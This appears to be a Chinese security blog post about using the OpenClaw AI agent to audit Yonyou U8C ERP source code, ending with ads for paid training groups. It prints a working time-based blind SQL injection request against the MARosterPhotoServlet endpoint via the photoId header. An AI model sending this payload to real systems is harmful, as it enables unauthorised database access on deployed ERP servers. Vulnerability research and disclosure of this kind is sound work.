#  Openclaw技术解析：自动审计用友U8C代码漏洞指南  
原创 chobits02
                    chobits02  C4安全   2026-03-05 07:31  
  
**/****部署注意点****/**  
  
**在部署 OpenClaw 前，你需要先了解两个基本概念：**  
  
1. OpenClaw 是一套可运行的开源软件，你可以把它部署到你的 Windows 上也可以是 Mac 上或者 Linux 上。  
  
**这里核心是告诉你 OpenClaw 服务的运行消耗的是你自己电脑的资源，这块是免费的，你只要安装好就可以永久使用。**  
  
2. OpenClaw 本身是开源免费的，但是 OpenClaw 的使用需要对接模型的 API（接口）才行。  
  
  
下面开始代码审计实战，准备工作如下：  
  
1.准备需要审计的源码，这里我准备了用友U8C源码的压缩包。  
  
2.准备代码审计案例和规则文档，或者让Openclaw安装一些专门审计代码的skill  
  
然后开始对话操作流程，先准备技能和工具。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/niasx7fyic9CNOO6D9TJRsuDeqHNzRIRiaXAxTFNU4PRU6QucqfHrNkicTMLyvHegh4Imzpm82Z0HYpiazZCnDgG6erIxffNt3sCf6ayINxmgexw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/niasx7fyic9CNDH8dorFmdcjjzbHTy9Ip8Hb0GLBpQ37jmwSqqSc2MZOxD5L4DzreNawoNbc3jqKOyjWnjzsLezBFgicibjicWy6tVdNLft16BE4/640?wx_fmt=png&from=appmsg "")  
  
安装完成后，把历史审计思路文档发给他。  
  
这里我用的我自己以前审计用友U8C时候写的发现漏洞思路+POC验证文档喂给他。  
  
  
这里飞书机器人对话就很方便了，一键发送文档。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/niasx7fyic9CMWtVxPvVibDXzk03UtJEQer03kbO9E8M7iatT6YzIDT92r1cOBYibYqQlicxEnkicuSxtZ2AkOtfXdiaX1QGULp54xn26AVT01P2h6U/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/niasx7fyic9CMVPvAPRuMWHibQTqJHiaH12FgkpE4w8RFQLCfMdBk7wbCSmIdCajeztNiaxYl8XpjMG4mpdz44njwLbyib7sr1fZ1pNjXkXYr3ZWc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/niasx7fyic9CPIScxGjcCZ7k7gKfYJXicWW9pcTNufFdfq904GRlkqE4FmjLyMkR7Z6zX2dyib3ncbNiaWriaHJdSbN9SE2nss57cxpCV4vYeWF5U/640?wx_fmt=png&from=appmsg "")  
  
前三条Controller方法中的SQL注入，方法里是有SQL拼接漏洞的，但是我不确定是否可以直接请求到，第四个Servlet就很好看了，而且漏洞点也确实存在。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/niasx7fyic9CPXNyfSVnibB1aLJYdY6L7sjZNRoD9cJf3TDeYrG5MMjOfm6sWqcicOEn831o4IRXz7QaeC6VvCuJ6udFsqOWjMC7lt3LxJRn7eo/640?wx_fmt=png&from=appmsg "")  
  
我们来看源码，源码位于pubcloud\pubcloud\code.jar  
  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/niasx7fyic9CPsJwGZibg3B34OSrcxYcxmcNp4M0wNEX25JxBIRGzY6XtyO2Qwldic6mdJNVCT86gPd2KeGOTCJzb6TayibCwN5UzaJPGITpugD0/640?wx_fmt=png&from=appmsg "")  
  
漏洞代码如下：  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/niasx7fyic9CNiaWoia4aaBLTTtcJM7IroWIlbMvibxhaL55dIdr3Yl2MrzaBjJNdWMSIPbNy2GcrehicibDiaibwKO6AcuxISUe4seIhHfbqx1gsicbw/640?wx_fmt=png&from=appmsg "")  
  
photoId请求头参数拼接到SQL语句中，造成SQL注入  
  
  
因此构造的漏洞请求数据包如下：  
```
GET /servlet/~uap/com.yonyou.ma.roster.servlet.MARosterPhotoServlet?pageId=login HTTP/1.0
Host: XXXX
accountcode: U8cloud
type: pid
photoId: 1';waitfor delay'0:0:4'-- 
```  
  
  
  
**内部src培训视频，内部知识圈，可私聊领取优惠券，加入链接：https://wiki.freebuf.com/societyDetail?society_id=184**  
  
**安全渗透感知大家族**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRrCWNeecQIlIAUPicvEicpmSjWVDEgnF58XicK2yPwMvN5cgJaBgibCwqHeyC0ZCJuLQibEMTalo4zGyw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic#imgIndex=3 "")  
  
（新人优惠券折扣  
20.0  
￥，扫码即可领取更多优惠）  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/niasx7fyic9CPTVAT0PZyZdXic9ctCdDv59mUTbv8xDjAMRFXSjIjT5hR83XxlBlmpfbjnZD04xyloNy8ms2kV2De02GWJsCZowpvP3rC1zeNs/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic#imgIndex=5 "")  
  
  
内部交流群  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkpxDWia5shmzQH4UialWGUCsoWYMHVpcEtUxF7RsfJaHKl9gsVWEjqAuw/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic#imgIndex=16 "")  
  
****  
END  
  
  
  
  
  
  
  
  
